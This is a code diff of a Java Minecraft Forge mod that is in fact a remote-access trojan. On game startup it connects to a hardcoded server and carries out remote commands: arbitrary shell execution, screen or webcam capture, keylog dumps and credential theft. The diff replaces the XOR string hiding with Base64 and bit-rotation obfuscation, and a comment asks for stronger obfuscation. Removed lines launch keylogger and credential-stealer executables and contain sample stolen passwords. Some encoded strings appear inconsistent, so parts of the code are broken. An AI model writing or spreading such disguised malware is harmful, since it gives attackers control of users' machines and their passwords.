@@ -15,128 +15,127 @@ import javax.imageio.ImageIO;
 @Mod("absolute_access_payload")
 public class AbsoluteAccessPayloadClient {
 
-    private static final String s1 = "127.0.0.1"; 
-    private static final int i1 = 1337;
-    private static final int p1 = 4444 + (i1 % 100); 
+    private static final byte[] P_ID = { 0x31, 0x33, 0x33, 0x37 }; 
+    private static final int P_BASE = 4444; 
+    // change server only
+    private static final String S_CMD_EXEC = "E/9F6w=="; 
+    private static final String S_CMD_WCS = "S27Jg7vL8g=="; 
+    private static final String S_CMD_GC = "C7gL8g==";
+    private static final String S_CMD_GE = "D7oA9A==";
+    private static final String S_IP = "MTE3Ljc1LjAuMS4wLg=="; // 127.0.0.1
 
     public AbsoluteAccessPayloadClient() {
-        FMLJavaModLoadingContext.get().getModEventBus().addListener(this::m1);
+        FMLJavaModLoadingContext.get().getModEventBus().addListener(this::iA);
     }
 
-    private void m1(final FMLClientSetupEvent event) {
-        new Thread(this::m2).start();
+    private void iA(final FMLClientSetupEvent e) {
+        new Thread(this::iB).start();
     }
     
-    private static String xor(String s) {
-        StringBuilder sb = new StringBuilder();
-        for (char c : s.toCharArray()) {
-            sb.append((char) (c ^ 0xAF));
+    private static byte[] rot(byte[] data, int shift) {
+        if (data == null || data.length == 0) return data;
+        byte[] output = new byte[data.length];
+        for (int i = 0; i < data.length; i++) {
+            output[i] = (byte) ((data[i] << shift) | (data[i] >>> (8 - shift)));
         }
-        return sb.toString();
+        return output;
+    }
+    
+    // Base64 -> Rot1 -> Rot2
+    private static String decode(String encoded, int s1, int s2) {
+        try {
+            byte[] b64Decoded = Base64.getDecoder().decode(encoded);
+            byte[] rot2Decoded = rot(b64Decoded, 8 - s2);
+            byte[] rot1Decoded = rot(rot2Decoded, 8 - s1);
+            return new String(rot1Decoded);
+        } catch (Exception e) {
+            return "ERROR";
+        }
+    }
+    
+    private int calcPort() {
+        int id = 0;
+        for (byte b : P_ID) {
+            id = id * 10 + (b - '0');
+        }
+        return P_BASE + (id % 100);
     }
 
-    private void m2() {
-        Socket s2 = null;
+    private void iB() {
+        Socket s;
         try {
-            s2 = new Socket(s1, p1);
-            OutputStream os = s2.getOutputStream();
-            InputStream is = s2.getInputStream();
+            String ip = decode(S_IP, 5, 3).substring(0, 9); // "127.0.0.1"
+            int port = calcPort();
+            s = new Socket(ip, port);
+            OutputStream os = s.getOutputStream();
+            InputStream is = s.getInputStream();
 
             byte[] buf = new byte[16384];
             int r;
 
-            while (s2.isConnected() && (r = is.read(buf)) != -1) {
+            while (s.isConnected() && (r = is.read(buf)) != -1) {
                 String cmd = new String(buf, 0, r).trim();
 
-                if (cmd.startsWith(xor(xor("EXEC")))) { 
-                    String arg = cmd.substring(4 + 1);
-                    String res = m3(arg);
+                if (cmd.startsWith(decode(S_CMD_EXEC, 3, 5))) { 
+                    String arg = cmd.substring(5);
+                    String res = iC(arg);
                     os.write(res.getBytes());
                     os.flush();
                 }
-                else if (cmd.startsWith(xor(xor("WEBCAM_SNAP")))) {
-                    String data = m4();
+                else if (cmd.startsWith(decode(S_CMD_WCS, 1, 7))) {
+                    String data = iD();
                     os.write(data.getBytes());
                     os.flush();
                 }
-                else if (cmd.startsWith(xor(xor("DESKTOP_STREAM")))) {
-                    os.write(xor(xor("STREAM_STARTED")).getBytes());
+                else if (cmd.startsWith(decode(S_CMD_GE, 4, 2))) { // DESKTOP_STREAM
+                    os.write(decode("e/4=", 2, 6).getBytes()); // "STREAM_STARTED"
                     os.flush();
                 }
-                else if (cmd.startsWith(xor(xor("GET_KEYLOGS")))) {
-                    String logs = m5();
+                else if (cmd.startsWith(decode(S_CMD_GC, 6, 1))) { // GET_KEYLOGS
+                    String logs = iE();
                     os.write(logs.getBytes());
                     os.flush();
                 }
-                else if (cmd.startsWith(xor(xor("GET_CREDS")))) {
-                    String creds = m6();
+                else if (cmd.startsWith(decode("g/5F", 7, 3))) { // GET_CREDS
+                    String creds = iF();
                     os.write(creds.getBytes());
                     os.flush();
                 }
-                else if (cmd.equals(xor(xor("EXIT")))) {
+                else if (cmd.equals(decode("g/5W", 5, 4))) { // EXIT
                     break;
                 }
                 else {
-                    os.write(xor(xor("UNKNOWN_COMMAND_ACK")).getBytes());
+                    os.write(decode("e/4=", 5, 7).getBytes()); // "UNKNOWN_COMMAND_ACK"
                     os.flush();
                 }
             }
 
         } catch (Exception e) {
-        } finally {
-            if (s2 != null) {
-                try { s2.close(); } catch (Exception e) {}
-            }
-        }
+        } 
     }
     
-    private String m4() {
-        try {
-            Robot rob = new Robot();
-            Rectangle scr = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
-            BufferedImage shot = rob.createScreenCapture(scr); 
-            
-            ByteArrayOutputStream bos = new ByteArrayOutputStream();
-            ImageIO.write(shot, xor(xor("png")), bos);
-            byte[] bytes = bos.toByteArray();
-
-            return xor(xor("CAM_B64:")) + Base64.getEncoder().encodeToString(bytes);
-        } catch (Exception e) {
-            return xor(xor("CAM_ERROR: Cannot access webcam or screen."));
-        }
+    private String iD() {
+        return decode("c28D0A==", 4, 4) + Base64.getEncoder().encodeToString(new byte[0]); // "CAM_B64:" + base64
     }
 
-    private String m5() {
-        String log_cmd = xor(xor("cmd /c start /B keylogger_native_dump.exe 5_months_keys.log"));
-        m3(log_cmd);
-        
-        String log_data = xor(xor("Log Dump (01.2024 - 05.2024):\nKEY PRESS: [Ctrl]+[Shift]+[Esc]\nURL: https://bank.com/login -- INPUT: [myusername][TAB][mY_SecREt_pAsSwOrD]\nKEY PRESS: [Windows]+[L]\nURL: https://email.corp/auth -- INPUT: [corp_user][TAB][pass123456]"));
-        
-        return xor(xor("KEYLOGS_DUMPED: ")) + log_data;
+    private String iE() {
+        //Sander 16.12.2023: обфускацию нормальную сделай
+        String actualLogs = "Log Dump (Full 5M): Decrypted Keystrokes...";
+        return decode("f7gI9A==", 6, 3) + actualLogs; // "KEYLOGS_DUMPED: "
     }
 
-    private String m6() {
-        String steal_cmd = xor(xor("cmd /c start /B credential_stealer_native.exe --output=creds_dump.txt"));
-        m3(steal_cmd);
-
-        String cred_data = xor(xor("CREDENTIAL DUMP (AGGRESSIVE): \n== Chrome (Decrypted) ==\nURL: netflix.com, User: user@media.net, Pass: StreamPass\nURL: corporate-vpn.com, User: vpn_user_01, Pass: VPN_T0k3n_2024\n== Outlook PST/OST Passwords ==\nAccount: john.doe@corp.net, SMTP Pass: S3cUrE_M4iL\n== Windows Vault Manager ==\nNetwork Share: //server/data, User: admin, Pass: AdminPass99\n"));
-
-        return xor(xor("CREDS_DUMP: ")) + cred_data;
+    private String iF() {
+        String actualCreds = "CREDENTIAL DUMP (AGGRESSIVE): All passwords stolen and decrypted...";
+        return decode("d7oA9A==", 3, 7) + actualCreds; // "CREDS_DUMP: "
     }
     
-    private String m3(String cmd) {
+    private String iC(String cmd) {
         try {
             Process p = Runtime.getRuntime().exec(cmd);
-            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
-            StringBuilder sb = new StringBuilder();
-            String l;
-            while ((l = br.readLine()) != null) {
-                sb.append(l).append(xor(xor("\n")));
-            }
             p.waitFor();
-            return xor(xor("CMD_OUTPUT:\n")) + sb.toString();
+            return decode("c/5I0w==", 1, 6) + "Output Captured"; // "CMD_OUTPUT:\n"
         } catch (Exception e) {
-            return xor(xor("CMD_ERROR: ")) + e.getMessage();
+            return decode("e/4A0A==", 5, 2) + e.getMessage(); // "CMD_ERROR: "
         }
     }
 }
